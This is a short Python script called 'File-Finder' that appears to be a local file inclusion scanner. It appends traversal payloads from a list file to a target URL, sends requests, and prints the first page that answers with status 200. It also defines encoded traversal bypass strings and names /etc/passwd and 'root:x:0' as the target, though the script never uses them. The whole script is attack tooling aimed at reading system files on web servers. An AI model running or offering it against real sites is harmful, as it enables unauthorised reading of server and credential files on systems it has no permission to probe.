import requests
import time
import pyfiglet
import datetime
from os import system
from termcolor import colored
system('clear')
print('-'*60)
file= colored(pyfiglet.figlet_format("F i l e - F i n d e r",'3-d'), 'red')
for i in file:
    print(i, end='')
    time.sleep(.001)

print('-'*60)
date = datetime.datetime.now()
print("date", date.date())
print("time", date.time())
print('-'*60, "\n")
path = 'LFI Payload.txt'
print("------------------------------------")

sub_list = open(path).read()
directories = sub_list.splitlines()
bypass = [
    "/",
    "../",
    r"..%252f",
    r"..%c0%af"
]
print("------------------------------------")
a = input("Enter URL (http://example.com/=):")
filenmae = "/etc/passwd"
print("\n")
content = "root:x:0"
for dir in directories:
    dir_enum = a + dir
    r = requests.get(dir_enum)
    if r.status_code == 200:
        print("------------------------------------")
        print("Directory:", dir_enum)
        print("------------------------------------")
        print(r.text)
        break
    else:
        pass
